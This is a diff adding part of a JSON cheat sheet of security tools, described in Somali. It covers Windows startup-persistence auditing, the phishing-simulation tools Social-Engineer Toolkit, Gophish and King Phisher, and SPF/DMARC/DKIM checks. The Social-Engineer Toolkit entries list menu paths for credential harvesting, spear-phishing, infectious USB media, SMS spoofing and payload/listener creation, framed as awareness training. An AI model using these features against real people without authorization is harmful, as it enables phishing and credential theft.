+      "installation": "curl -LO https://download.sysinternals.com/files/Autoruns.zip && tar -xf Autoruns.zip",
+      "commands": [
+        {
+          "command": "autorunsc.exe -a * -c",
+          "description": "Soo saarista dhammaan meelaha barnaamijyada Windows toos uga bilowdaan (Startup, Registry, Services) qaab CSV ah."
+        },
+        {
+          "command": "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}",
+          "description": "PowerShell command lagu baarayo dhammaan Scheduled Tasks-ka firfircoon ee Windows."
+        },
+        {
+          "command": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "description": "Baarista Registry Run keys-ka Windows."
+        }
+      ]
+    }
+  },
+  "Social Engineering & Awareness Simulation": {
+    "Social-Engineer Toolkit (SET)": {
+      "installation": "sudo apt install set -y   (ama: git clone https://github.com/trustedsec/social-engineer-toolkit.git)",
+      "commands": [
+        {
+          "command": "sudo setoolkit",
+          "description": "Kicinta menu-ga guud ee SET si loo sameeyo tababarka wacyigelinta amniga shaqaalaha."
+        },
+        {
+          "command": "setoolkit -> 1) Social-Engineering Attacks",
+          "description": "Qaybta tijaabinta nuglaanta aadanaha ee nidaamyada ururka."
+        },
+        {
+          "command": "setoolkit -> 1 -> 2) Website Attack Vectors",
+          "description": "Qaybta tijaabinta wacyigelinta bogagga web-ka (Credential Harvester simulation)."
+        },
+        {
+          "command": "setoolkit -> 1 -> 1) Spear-Phishing Attack Vectors",
+          "description": "Qaybta tababarka email-lada phishing-ka ee shaqaalaha loo diro."
+        },
+        {
+          "command": "setoolkit -> 1 -> 3) Infectious Media Generator",
+          "description": "Tijaabinta wacyigelinta USB-yada halista ah ee goobaha shaqada lagu tuuro."
+        },
+        {
+          "command": "setoolkit -> 1 -> 5) Mass Mailer Attack",
+          "description": "Dirista email-lada wacyigelinta oo ballaaran."
+        },
+        {
+          "command": "setoolkit -> 4) Update the Social-Engineer Toolkit",
+          "description": "Cusboonaysiinta SET noocii ugu dambeeyay."
+        },
+        {
+          "command": "setoolkit -> 5) Update SET configuration",
+          "description": "Dib u qaabeynta set.config faylka."
+        },
+        {
+          "command": "setoolkit -> 1 -> 7) SMS Spoofing Attack Vector",
+          "description": "Tijaabinta wacyigelinta SMS Smishing-ka."
+        },
+        {
+          "command": "setoolkit -> 1 -> 4) Create a Payload and Listener",
+          "description": "Abuurista listener iyo payload tijaabo ah."
+        }
+      ]
+    },
+    "Gophish": {
+      "installation": "curl -LO https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip && unzip gophish*.zip",
+      "commands": [
+        {
+          "command": "./gophish",
+          "description": "Kicinta server-ka Gophish ee tababarka wacyigelinta email-lada phishing-ka ee shirkadaha."
+        },
+        {
+          "command": "https://127.0.0.1:3333",
+          "description": "Furista Web Admin Dashboard-ka Gophish si loo maamulo ololaha wacyigelinta."
+        },
+        {
+          "command": "grep \"Temporary Password\" gophish.log",
+          "description": "Soo saarista furaha koowaad ee Admin-ka ee ku qoran log faylka."
+        },
+        {
+          "command": "nano config.json",
+          "description": "Faylka qaabeynta Gophish ee lagu beddelo listening IP iyo dakadaha."
+        },
+        {
+          "command": "sudo ./gophish &",
+          "description": "Kicinta Gophish isagoo ku shaqaynaya background-ka."
+        },
+        {
+          "command": "sudo systemctl status gophish",
+          "description": "Hubinta in adeegga Gophish uu si nabad ah u socdo."
+        },
+        {
+          "command": "curl http://127.0.0.1:80",
+          "description": "Hubinta in phishing landing server-ku uu firfircoon yahay."
+        },
+        {
+          "command": "tail -f gophish.log",
+          "description": "Kormeerka tooska ah ee xogta soo galaysa Gophish (Live logs)."
+        },
+        {
+          "command": "sudo killall gophish",
+          "description": "Joojinta dhammaan adeegyada Gophish ee socda."
+        },
+        {
+          "command": "openssl req -newkey rsa:2048 -nodes -keyout gophish.key -x509 -days 365 -out gophish.crt",
+          "description": "Abuurista shahaadada SSL ee Gophish Web Dashboard."
+        }
+      ]
+    },
+    "King Phisher": {
+      "installation": "git clone https://github.com/rsmusllp/king-phisher.git && cd king-phisher && sudo ./tools/install.sh",
+      "commands": [
+        {
+          "command": "sudo king-phisher-server -c server_config.yml",
+          "description": "Kicinta server-ka simulation-ka ee King Phisher ee loogu talagalay tijaabinta shaqaalaha."
+        },
+        {
+          "command": "king-phisher",
+          "description": "Kicinta barnaamijka GUI Client-ka ee lagu naqshadeeyo fariimaha tababarka."
+        }
+      ]
+    },
+    "Email Spoofing & Domain Security Audit": {
+      "installation": "sudo apt install dnsutils -y",
+      "commands": [
+        {
+          "command": "dig TXT <domain.com> | grep \"v=spf1\"",
+          "description": "Hubinta diiwaanka SPF (Sender Policy Framework) si loo ogaado in domain-ka email-kiisa la dhoodhoobi karo (Email Spoofing)."
+        },
+        {
+          "command": "dig TXT _dmarc.<domain.com>",
+          "description": "Hubinta DMARC policy-ga domain-ka si loo xaqiijiyo ilaalinta email-lada shirkadda."
+        },
+        {
+          "command": "dig TXT *._domainkey.<domain.com>",
+          "description": "Hubinta DKIM (DomainKeys Identified Mail) keys ee domain-ka."
+        }
+      ]
+    }
+  }
+}
